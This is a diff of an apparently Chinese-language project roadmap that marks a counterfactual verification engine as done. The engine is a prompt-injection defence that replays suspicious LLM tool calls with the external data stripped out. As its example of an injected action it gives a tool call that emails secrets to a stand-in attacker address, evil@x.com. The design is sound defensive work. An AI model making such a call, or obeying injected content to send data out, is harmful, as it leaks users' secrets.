@@ -383,7 +383,7 @@
 > 理论基础：AttriGuard (arXiv:2603.10749) — 行动级因果归因，反事实测试
 > 依赖：✅ 现有 LLMProxy + 上游路由能力（用于反事实重放）
 
-- [ ] v24.0 **反事实验证引擎（CounterfactualVerifier）** 🔥
+- [x] v24.0 **反事实验证引擎（CounterfactualVerifier）** ✅ (commit 092a0d7, 2026-03-25)
   - **核心原理**: 对每个可疑 tool call，构造"没有外部数据"的对照请求重放
     1. LLM 提出 tool_call（如 `send_email(evil@x.com, secrets)`）
     2. 龙虾卫士截获，构造对照 prompt：移除所有外部数据（tool_result / 网页内容 / 文件内容）
